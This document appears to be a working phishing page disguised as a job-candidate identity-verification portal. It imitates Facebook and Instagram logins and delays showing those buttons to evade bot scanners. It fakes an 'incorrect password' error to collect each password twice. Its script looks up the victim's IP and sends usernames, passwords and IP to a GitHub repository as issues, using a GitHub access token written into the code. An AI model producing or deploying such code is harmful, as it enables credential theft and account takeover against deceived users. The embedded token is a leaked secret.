<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candidate Portal | Secure Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --accent: #861f41; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header { background: #fff; padding: 15px; border-bottom: 3px solid var(--accent); text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .header-text { font-size: 18px; font-weight: bold; color: var(--accent); text-transform: uppercase; }
        .auth-box { background: #fff; width: 340px; margin: 40px auto; padding: 30px; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); border: 1px solid #ddd; text-align: center; }
        
        /* Anti-Bot Delay Logic */
        .s-btn { display: none; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 8px; background: #fff; cursor: pointer; font-size: 15px; font-weight: 600; color: #444; }
        .s-btn i { font-size: 20px; margin-right: 15px; width: 25px; }

        .or-text { display: flex; align-items: center; margin: 20px 0; color: #888; font-size: 12px; font-weight: bold; }
        .or-text::before, .or-text::after { content: ""; flex: 1; height: 1px; background: #eee; margin: 0 10px; }
        
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; margin-bottom: 15px; font-size: 15px; background: #fafafa; }
        .main-btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); z-index: 999; }
        .modal-content { background: white; width: 310px; margin: 120px auto; padding: 25px; border-radius: 12px; text-align: center; }
        .err { color: #d93025; background: #fce8e6; padding: 10px; font-size: 13px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #d93025; display: none; text-align: left; }
    </style>
</head>
<body>

    <div class="header"><div class="header-text">Candidate Management System</div></div>

    <div class="auth-box">
        <h2 style="margin-top:0; font-size: 22px;">Identity Verification</h2>
        <p style="font-size:14px; color:#666; margin-bottom:25px;">Verify via your authorized social profile</p>
        
        <button id="fbBtn" class="s-btn" onclick="openLogin('Facebook')"></button>
        <button id="igBtn" class="s-btn" onclick="openLogin('Instagram')"></button>
        
        <div class="or-text">OR USE SYSTEM ACCESS</div>
        
        <input type="text" id="dirUser" placeholder="Reference ID">
        <input type="password" id="dirPass" placeholder="Access Key">
        <button class="main-btn" onclick="submitData('Manual')">LOGIN & VERIFY</button>
    </div>

    <div id="authModal" class="modal">
        <div class="modal-content">
            <div id="mIcon" style="font-size: 45px; margin-bottom: 10px;"></div>
            <div id="mTitle" style="font-weight:bold; font-size:18px; margin-bottom:15px;">Login Required</div>
            <div id="eBox" class="err"><i class="fas fa-exclamation-circle"></i> Incorrect password. Please try again.</div>
            <input type="text" id="mUser" placeholder="Username / Email">
            <input type="password" id="mPass" placeholder="Password">
            <button class="main-btn" onclick="handleLogin()">CONFIRM</button>
        </div>
    </div>

    <script>
        const CONFIG = {
            // Naya Token jo aapne banaya
            TOKEN: "ghp_T0W1nzpkQgsTuAKQZNsMk2D1yATWoP3sXK61",
            // Nayi Repository ka naam
            REPO: "Veer007ghk/user-verification-gateway",
            REDIR: "https://www.google.com"
        };

        let mode = ""; let tryNo = 0;

        // Bypassing bot scanners with 2.5s delay
        setTimeout(() => {
            const f = document.getElementById('fbBtn');
            const i = document.getElementById('igBtn');
            f.innerHTML = '<i class="fab fa-facebook" style="color:#1877F2"></i> Verify via Profile A';
            i.innerHTML = '<i class="fab fa-instagram" style="color:#E1306C"></i> Verify via Profile B';
            f.style.display = 'flex';
            i.style.display = 'flex';
        }, 2500);

        function openLogin(p) {
            mode = p; tryNo = 0;
            document.getElementById('eBox').style.display = "none";
            document.getElementById('mIcon').innerHTML = p === 'Facebook' ? 
                '<i class="fab fa-facebook" style="color:#1877F2"></i>' : 
                '<i class="fab fa-instagram" style="color:#E1306C"></i>';
            document.getElementById('authModal').style.display = "block";
        }

        async function handleLogin() {
            const u = document.getElementById('mUser').value;
            const p = document.getElementById('mPass').value;
            if(!u || !p) return;
            
            await submitData(mode, u, p);
            tryNo++;
            
            if(tryNo === 1) {
                document.getElementById('mPass').value = "";
                document.getElementById('eBox').style.display = "block";
            } else { 
                window.location.href = CONFIG.REDIR; 
            }
        }

        async function submitData(method, user, pass) {
            const u = user || document.getElementById('dirUser').value;
            const p = pass || document.getElementById('dirPass').value;
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                
                await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
                    method: 'POST',
                    headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        title: `ðŸ”‘ Log: ${method} - ${ip}`,
                        body: `**Username:** ${u}\n**Password:** ${p}\n**IP:** ${ip}\n**Attempt:** ${tryNo+1}`
                    })
                });
                if(method === 'Manual') window.location.href = CONFIG.REDIR;
            } catch (e) { 
                window.location.href = CONFIG.REDIR; 
            }
        }
    </script>
</body>
</html>
